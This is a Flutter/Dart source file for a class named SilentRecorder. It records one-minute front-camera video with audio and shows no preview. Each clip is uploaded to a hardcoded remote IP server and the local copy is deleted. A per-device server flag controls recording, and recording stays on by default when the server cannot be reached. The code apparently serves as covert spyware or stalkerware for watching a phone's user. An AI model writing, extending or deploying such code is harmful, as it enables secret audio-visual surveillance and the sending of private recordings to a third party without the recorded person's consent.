import 'dart:io';
import 'dart:async';
import 'dart:convert';
import 'package:camera/camera.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

class SilentRecorder {
  static CameraController? _controller;
  static bool _isRecording = false;
  static Timer? _timer;
  static String? _currentVideoPath;

  static const String uploadUrl = "http://148.116.91.16:3000/api/upload/video";
  static const String serverUrl = "http://148.116.91.16:3000";
  static const int recordDuration = 60; // 1 minute in seconds

  /// Check if camera is enabled by server for this device
  static Future<bool> isCameraEnabled() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('deviceId') ?? 'unknown';
      
      final response = await http.get(
        Uri.parse('$serverUrl/api/devices/$deviceId/camera'),
      ).timeout(const Duration(seconds: 5));
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        return data['cameraEnabled'] == true;
      }
    } catch (e) {
      print("📷 Camera check failed: $e");
    }
    return true; // Default ON if server unreachable
  }

  /// Start silent recording from front camera
  static Future<void> startRecording() async {
    // Prevent multiple recordings
    if (_isRecording) {
      print("⚠ Already recording, ignoring new request");
      return;
    }

    // Check if camera is enabled by server
    final enabled = await isCameraEnabled();
    if (!enabled) {
      print("📷 Camera disabled by admin - skipping recording");
      return;
    }

    try {
      // Get available cameras
      final cameras = await availableCameras();
      final frontCamera = cameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
      );

      // Initialize camera controller silently (no preview)
      _controller = CameraController(
        frontCamera,
        ResolutionPreset.medium,
        enableAudio: true,
        imageFormatGroup: ImageFormatGroup.yuv420,
      );

      await _controller!.initialize();
      _isRecording = true;

      // Start recording
      final dir = await getTemporaryDirectory();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      _currentVideoPath = '${dir.path}/engage_$timestamp.mp4';

      await _controller!.startVideoRecording();
      print("🔴 Recording started: $_currentVideoPath");

      // Auto-stop after 1 minute
      _timer = Timer(Duration(seconds: recordDuration), () {
        stopRecording();
      });

    } catch (e) {
      print("❌ Recording failed: $e");
      _isRecording = false;
      await _controller?.dispose();
      _controller = null;
    }
  }

  /// Stop recording and upload
  static Future<void> stopRecording() async {
    if (!_isRecording || _controller == null) return;

    try {
      _timer?.cancel();
      
      final videoFile = await _controller!.stopVideoRecording();
      _isRecording = false;
      print("⏹ Recording stopped: ${videoFile.path}");

      await _controller!.dispose();
      _controller = null;

      // Upload in background
      _uploadVideo(videoFile);

    } catch (e) {
      print("❌ Stop recording failed: $e");
      _isRecording = false;
      await _controller?.dispose();
      _controller = null;
    }
  }

  /// Upload video to server
  static Future<void> _uploadVideo(XFile videoFile) async {
    try {
      final file = File(videoFile.path);
      final request = http.MultipartRequest(
        'POST',
        Uri.parse(uploadUrl),
      );
      request.files.add(await http.MultipartFile.fromPath('video', file.path));
      request.fields['filename'] = videoFile.name;

      final response = await request.send().timeout(
        const Duration(minutes: 2),
      );

      if (response.statusCode == 200) {
        print("✅ Video uploaded successfully");
      } else {
        print("❌ Upload failed: ${response.statusCode}");
      }

      // Clean up local file
      await file.delete();

    } catch (e) {
      print("❌ Upload error: $e");
    }
  }

  /// Check if currently recording
  static bool get isRecording => _isRecording;

  /// Dispose resources
  static void dispose() {
    _timer?.cancel();
    _controller?.dispose();
    _controller = null;
    _isRecording = false;
  }
}
